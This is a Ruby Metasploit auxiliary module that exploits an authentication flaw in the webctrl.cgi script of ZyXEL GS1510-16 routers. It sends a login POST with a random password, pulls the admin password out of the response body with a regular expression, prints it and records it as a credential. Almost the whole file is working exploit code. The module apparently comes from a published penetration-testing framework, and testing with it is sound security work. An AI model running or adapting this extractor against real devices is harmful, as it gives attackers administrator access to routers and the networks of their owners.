##
# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Auxiliary

  include Msf::Auxiliary::Report
  include Msf::Exploit::Remote::HttpClient

  def initialize
    super(
      'Name'        => 'ZyXEL GS1510-16 Password Extractor',
      'Description' => %q{
          This module exploits a vulnerability in ZyXEL GS1510-16 routers
          to extract the admin password. Due to a lack of authentication on the
          webctrl.cgi script, unauthenticated attackers can recover the
          administrator password for these devices. The vulnerable device
          has reached end of life for support from the manufacturer, so it is
          unlikely this problem will be addressed.
      },
      'References'  =>
        [
          [ 'URL', 'https://github.com/rapid7/metasploit-framework/pull/2709' ]
        ],
      'Author'      => [
        'Daniel Manser', # @antsygeek
        'Sven Vetsch' # @disenchant_ch
      ],
      'License'     => MSF_LICENSE
    )
  end

  def report_cred(opts)
    service_data = {
      address: opts[:ip],
      port: opts[:port],
      service_name: opts[:service_name],
      protocol: 'tcp',
      workspace_id: myworkspace_id
    }

    credential_data = {
      origin_type: :service,
      module_fullname: fullname,
      username: opts[:user],
      private_data: opts[:password],
      private_type: :password
    }.merge(service_data)

    login_data = {
      core: create_credential(credential_data),
      status: Metasploit::Model::Login::Status::UNTRIED,
      proof: opts[:proof]
    }.merge(service_data)

    create_credential_login(login_data)
  end

  def run
    begin
    print_status("Trying to get 'admin' user password ...")
    res = send_request_cgi({
      'uri'       => "/webctrl.cgi",
      'method'    => 'POST',
      'vars_post' => {
        'username' => "admin",
        'password' => "#{Rex::Text.rand_text_alphanumeric(rand(4)+4)}",
        'action' => "cgi_login"
      }
    }, 10)

    if (res && res.code == 200)
      print_status("Got response from router.")
    else
      print_error('Unexpected HTTP response code.')
      return
    end

    admin_password = ""
    admin_password_matches = res.body.match(/show_user\(1,"admin","(.+)"/);

    if not admin_password_matches
      print_error('Could not obtain admin password')
      return
    else
      admin_password = admin_password_matches[1];
      print_good("Password for user 'admin' is: #{admin_password}")

      report_cred(
        ip: rhost,
        port: rport,
        service_name: 'ZyXEL GS1510-16',
        user: 'admin',
        password: admin_password,
        proof: res.body
      )
    end
  rescue ::Rex::ConnectionError
    print_error("#{rhost}:#{rport} - Failed to connect")
    return
  end
  end
end
